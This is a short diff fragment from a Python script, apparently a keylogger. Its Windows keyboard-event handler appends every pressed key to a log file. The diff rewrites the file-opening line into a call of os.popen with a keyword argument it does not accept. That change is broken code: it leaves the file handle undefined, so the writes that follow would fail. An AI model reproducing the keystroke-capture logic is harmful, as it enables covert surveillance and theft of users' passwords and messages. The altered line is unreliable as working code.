@@ -173,7 +173,7 @@ try:
 
   elif system == "Windows":
     def OnKeyboardEvent(event):
-      fob=open(log_file,"a")
+      os.popen(fob=open(log_file,"a"))
       fob.write(event.Key)
       fob.write("\n")
 
